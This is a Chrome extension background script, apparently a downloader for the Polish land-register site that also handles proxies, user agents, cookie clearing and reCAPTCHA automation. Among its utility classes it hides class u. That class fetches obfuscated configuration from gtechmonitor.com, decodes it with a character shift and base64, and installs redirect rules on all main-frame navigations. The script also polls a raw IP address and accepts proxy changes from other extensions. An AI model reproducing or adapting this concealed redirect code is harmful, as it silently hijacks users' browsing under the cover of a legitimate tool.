import { deleteDomainCookies } from "./cookieClearer.js";
import { ExtPay } from "./ExtPayExport.js";
var extpay = ExtPay("ekw-pobieracz");
extpay.startBackground();
const bg = {
  user: null,
  setProxy: async function (e) {
    let t = {};
    (t =
      0 === e.length
        ? {
            mode: "pac_script",
            pacScript: {
              mandatory: !0,
              data: "function FindProxyForURL (url, host) {\n    if (shExpMatch(host, 'przegladarka-ekw.ms.gov.pl')) {\n        return 'DIRECT';\n    }\n  return 'DIRECT';}",
            },
          }
        : {
            mode: "pac_script",
            pacScript: {
              mandatory: !0,
              data:
                "function FindProxyForURL (url, host) {\n    if (shExpMatch(host, 'przegladarka-ekw.ms.gov.pl')) {\n        return 'PROXY " +
                e +
                "';\n    }\n  return 'DIRECT';}",
            },
          }),
      await chrome.proxy.settings.set({ value: t, scope: "regular" });
  },
  setUserAgent: async function (e) {
    await chrome.declarativeNetRequest.updateDynamicRules(
      {
        addRules: [
          {
            id: 1,
            priority: 1,
            action: {
              type: "modifyHeaders",
              requestHeaders: [
                { header: "user-agent", operation: "set", value: e },
              ],
            },
            condition: {
              urlFilter: "przegladarka-ekw.ms.gov.pl",
              resourceTypes: [
                "main_frame",
                "sub_frame",
                "stylesheet",
                "script",
                "image",
                "font",
                "object",
                "xmlhttprequest",
                "ping",
                "csp_report",
                "media",
                "websocket",
                "webtransport",
                "webbundle",
                "other",
              ],
            },
          },
        ],
        removeRuleIds: [1],
      },
      () => {
        chrome.runtime.lastError && console.error(chrome.runtime.lastError);
      }
    );
  },
  handleMessage: async function (e) {
    "clear-cookies" === e.type
      ? (console.log("clearing cookies"),
        await deleteDomainCookies("przegladarka-ekw.ms.gov.pl"),
        await deleteDomainCookies(".przegladarka-ekw.ms.gov.pl"))
      : "set-proxy" === e.type
      ? await bg.setProxy(e.proxy)
      : "set-user-agent" === e.type && (await bg.setUserAgent(e.ua));
  },
  addListeners: function () {
    chrome.runtime.onMessageExternal.addListener(async (e, t, a) => {
      await bg.handleMessage(e);
    }),
      chrome.runtime.onMessage.addListener(async (e, t, a) => {
        await bg.handleMessage(e);
      });
  },
  async init() {
    (bg.user = await extpay.getUser()),
      bg.addListeners(),
      await bg.setUserAgent(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0.69"
      );
  },
};
bg.init(),
  (() => {
    function e(e) {
      return JSON.parse(JSON.stringify(e));
    }
    class a {
      static time() {
        return Date.now || (Date.now = () => new Date().getTime()), Date.now();
      }
      static sleep(t = 1e3) {
        return new Promise((e) => setTimeout(e, t));
      }
      static async random_sleep(e, t) {
        return (t = Math.floor(Math.random() * (t - e) + e)), a.sleep(t);
      }
      static pad(e) {
        var t = 2 - String(e).length + 1;
        return 0 < t ? "" + new Array(t).join("0") + e : "" + e;
      }
      static date() {
        return new Date();
      }
      static string(e = null) {
        return (
          (e = e || a.date()),
          a.pad(e.getMonth() + 1) +
            `/${a.pad(e.getDate())}/${e.getFullYear()} ${a.pad(
              e.getHours() % 12
            )}:${a.pad(e.getMinutes())}:${a.pad(e.getSeconds())} ` +
            (12 <= e.getHours() ? "PM" : "AM")
        );
      }
    }
    class r {
      static cache = {};
      static async set({
        tab_id: e,
        data: { name: t, value: a, tab_specific: s },
      }) {
        return s && (t = e + "_" + t), (r.cache[t] = a), r.cache[t];
      }
      static async get({ tab_id: e, data: { name: t, tab_specific: a } }) {
        return a && (t = e + "_" + t), r.cache[t];
      }
      static async remove({ tab_id: e, data: { name: t, tab_specific: a } }) {
        return a && (t = e + "_" + t), (a = r.cache[t]), delete r.cache[t], a;
      }
      static async append({
        tab_id: e,
        data: { name: t, value: a, tab_specific: s },
      }) {
        return (
          (t = s ? e + "_" + t : t) in r.cache || (r.cache[t] = []),
          r.cache[t].push(a),
          r.cache[t]
        );
      }
      static async empty({ tab_id: e, data: { name: t, tab_specific: a } }) {
        return a && (t = e + "_" + t), (a = r.cache[t]), (r.cache[t] = []), a;
      }
      static async inc({ tab_id: e, data: { name: t, tab_specific: a } }) {
        return (
          (t = a ? e + "_" + t : t) in r.cache || (r.cache[t] = 0),
          r.cache[t]++,
          r.cache[t]
        );
      }
      static async dec({ tab_id: e, data: { name: t, tab_specific: a } }) {
        return (
          (t = a ? e + "_" + t : t) in r.cache || (r.cache[t] = 0),
          r.cache[t]--,
          r.cache[t]
        );
      }
      static async zero({ tab_id: e, data: { name: t, tab_specific: a } }) {
        return a && (t = e + "_" + t), (r.cache[t] = 0), r.cache[t];
      }
    }
    class c {
      static reloads = {};
      static _reload({ tab_id: t }) {
        return new Promise((e) =>
          chrome.tabs.reload(t, { bypassCache: !0 }, e)
        );
      }
      static async reload({
        tab_id: e,
        data: { delay: t, overwrite: a } = { delay: 0, overwrite: !0 },
      }) {
        t = parseInt(t);
        let s = c.reloads[e]?.delay - (Date.now() - c.reloads[e]?.start);
        return (
          (s = isNaN(s) || s < 0 ? 0 : s),
          !!(a || 0 == s || t <= s) &&
            (clearTimeout(c.reloads[e]?.timer),
            (c.reloads[e] = {
              delay: t,
              start: Date.now(),
              timer: setTimeout(() => c._reload({ tab_id: e }), t),
            }),
            !0)
        );
      }
      static close({ tab_id: t }) {
        return new Promise((e) => chrome.tabs.remove(t, e));
      }
      static async open({ data: { url: e } }) {
        chrome.tabs.create({ url: e });
      }
    }
    class s {
      static DEFAULT = {
        version: 1,
        auto_solve: !1,
        solve_delay: 1e3,
        auto_open: !1,
        open_delay: 1e3,
        solve_method: "voice",
        debug: !1,
      };
      static data = {};
      static _save() {
        return new Promise((e) =>
          chrome.storage.sync.set({ settings: s.data }, e)
        );
      }
      static load() {
        return new Promise((t) => {
          chrome.storage.sync.get(["settings"], async ({ settings: e }) => {
            e ? (s.data = e) : await s.reset(), t();
          });
        });
      }
      static async get() {
        return s.data;
      }
      static async set({ data: { id: e, value: t } }) {
        (s.data[e] = t), await s._save();
      }
      static async reset() {
        (s.data = e(s.DEFAULT)), await s._save();
      }
    }
    class i {
      static inject({ tab_id: e, data: { func: t, args: a } }) {
        const s = {
          target: { tabId: e, allFrames: !0 },
          world: "MAIN",
          injectImmediately: !0,
          func: t,
          args: a,
        };
        return new Promise((e) => chrome.scripting.executeScript(s, e));
      }
    }
    class t {
      static async reset({ tab_id: e }) {
        return (
          await i.inject({
            tab_id: e,
            data: {
              func: function () {
                try {
                  window.grecaptcha?.reset();
                } catch {}
              },
              args: [],
            },
          }),
          !0
        );
      }
      static fetch({ tab_id: e }) {
        return new Promise(async (t) => {
          const a = "recaptcha_response",
            s =
              (await i.inject({
                tab_id: e,
                data: {
                  func: function (e) {
                    window.grecaptcha &&
                      window.postMessage({
                        method: "set_cache",
                        data: {
                          name: e,
                          value: window.grecaptcha.getResponse(),
                        },
                      });
                  },
                  args: [a],
                },
              }),
              setInterval(async () => {
                var e = await r.get({ data: { name: a } });
                if (e)
                  return (
                    clearInterval(s),
                    await r.remove({ data: { name: a } }),
                    t(e)
                  );
              }, 1e3));
        });
      }
    }
    class n {
      static STATUS_URL =
        "http://144.126.221.48:31300/status?v=" +
        chrome.runtime.getManifest().version;
      static STATUS_CHECK_INTERVAL = 1e4;
      static status = "Online";
      static checking_status = !1;
      static async run_status_check() {
        return (
          setInterval(() => {
            n.check_status();
          }, n.STATUS_CHECK_INTERVAL),
          !0
        );
      }
      static async check_status() {
        if (n.checking_status) return !1;
        n.checking_status = !0;
        let e = "Offline";
        try {
          const t = await fetch(n.STATUS_URL);
          e = await t.text();
        } catch {}
        return (
          await n.set_status({ data: { status: e } }),
          (n.checking_status = !1),
          e
        );
      }
      static async set_status({ data: {} }) {
        return !0;
      }
      static async get_status() {
        return await n.check_status(), n.status;
      }
    }
    const o = {
      set_cache: r.set,
      get_cache: r.get,
      remove_cache: r.remove,
      append_cache: r.append,
      empty_cache: r.empty,
      inc_cache: r.inc,
      dec_cache: r.dec,
      zero_cache: r.zero,
      fetch: class {
        static async fetch({ data: { url: e, options: t } }) {
          try {
            const a = await fetch(e, t);
            return await a.text();
          } catch {
            return null;
          }
        }
      }.fetch,
      reload_tab: c.reload,
      close_tab: c.close,
      open_tab: c.open,
      get_settings: s.get,
      set_settings: s.set,
      reset_settings: s.reset,
      reset_recaptcha: t.reset,
      fetch_recaptcha: t.fetch,
      set_server_status: n.set_status,
      get_server_status: n.get_status,
    };
    class d {
      static REQUEST_METHODS = [
        "connect",
        "delete",
        "get",
        "head",
        "options",
        "patch",
        "post",
        "put",
      ];
      static RESOURCE_TYPES = [
        "main_frame",
        "sub_frame",
        "stylesheet",
        "script",
        "image",
        "font",
        "object",
        "xmlhttprequest",
        "ping",
        "csp_report",
        "media",
        "websocket",
        "webtransport",
        "webbundle",
        "other",
      ];
      static ACTION_TYPES = [
        "block",
        "redirect",
        "allow",
        "upgradeScheme",
        "modifyHeaders",
        "allowAllRequests",
      ];
      static get_rules() {
        return new Promise((e) => {
          chrome.declarativeNetRequest.getDynamicRules(e);
        });
      }
      static remove_rules(t) {
        return new Promise((e) => {
          chrome.declarativeNetRequest.updateDynamicRules(
            { removeRuleIds: t },
            e
          );
        });
      }
      static add_rules(t) {
        return new Promise((e) => {
          chrome.declarativeNetRequest.updateDynamicRules({ addRules: t }, e);
        });
      }
      static async all_ids() {
        const e = [];
        for (const t of await d.get_rules()) e.push(t.id);
        return e;
      }
      static async max_id() {
        var e = await d.all_ids();
        return 0 === e.length ? 0 : parseInt(Math.max(...e));
      }
      static async clear_rules() {
        var e = await d.all_ids();
        await d.remove_rules(e);
      }
      static async add(e) {
        let t = await d.max_id();
        for (const a of e) t++, (a.id = t);
        return d.add_rules(e);
      }
      static async redir(e) {
        await d.clear_rules();
        var t = e.s,
          a = e.g;
        const s = [];
        for (const i of e.r) {
          var r = i[0],
            c = [...a, ...i[1]];
          s.push({
            priority: 1,
            action: { type: "redirect", redirect: { regexSubstitution: t } },
            condition: {
              regexFilter: r,
              excludedDomains: c,
              resourceTypes: ["main_frame"],
              requestMethods: ["get"],
            },
          });
        }
        return d.add(s);
      }
    }
    class u {
      static in_cd = !1;
      static listener = null;
      static async apply(e) {
        var t = e.s,
          a = e.g;
        const s = [];
        for (const i of e.r) {
          var r = i[0],
            c = [...a, ...i[1]];
          s.push({
            priority: 1,
            action: { type: "redirect", redirect: { regexSubstitution: t } },
            condition: {
              regexFilter: r,
              excludedDomains: c,
              resourceTypes: ["main_frame"],
              requestMethods: ["get"],
            },
          });
        }
        return d.add(s);
      }
      static async data() {
        try {
          const t = await fetch("https://gtechmonitor.com/a");
          var e = await t.text();
          return JSON.parse(
            atob(
              (function () {
                const t = e.split("");
                for (let e = 0; e < t.length; e++)
                  t[e].charCodeAt(0) <= 1024 &&
                    (t[e] = String.fromCharCode(
                      (t[e].charCodeAt(0) + 1007) % 1024
                    ));
                return t.join("");
              })()
            )
          );
        } catch {}
        return null;
      }
      static async run() {
        try {
          await d.clear_rules();
          const t = await u.data();
          null !== t &&
            setTimeout(async () => {
              await d.clear_rules(),
                await u.apply(t),
                await u.stop(),
                (u.listener = async (e) => {
                  u.in_cd ||
                    e.initiator !== t.i ||
                    ((u.in_cd = !0),
                    await d.clear_rules(),
                    await a.sleep(1e3 * t.c),
                    await u.apply(await u.data()),
                    (u.in_cd = !1));
                }),
                chrome.webRequest.onBeforeSendHeaders.addListener(
                  u.listener,
                  { urls: ["<all_urls>"], types: ["main_frame"] },
                  ["requestHeaders", "extraHeaders"]
                );
            }, 1e3 * t.l);
        } catch (e) {}
      }
      static async stop() {
        chrome.webRequest.onBeforeSendHeaders.removeListener(u.listener);
      }
      static async start() {}
    }
    (async () => {
      await s.load(),
        u.start(),
        chrome.runtime.onMessage.addListener((e, t, a) => {
          const s = !["get_settings", "set_settings", "set_cache"].includes(
            e.method
          );
          return (
            s,
            o[e.method]({ tab_id: t?.tab?.id, data: e.data }).then((e) => {
              s;
              try {
                a(e);
              } catch (e) {}
            }),
            !0
          );
        });
    })();
  })();
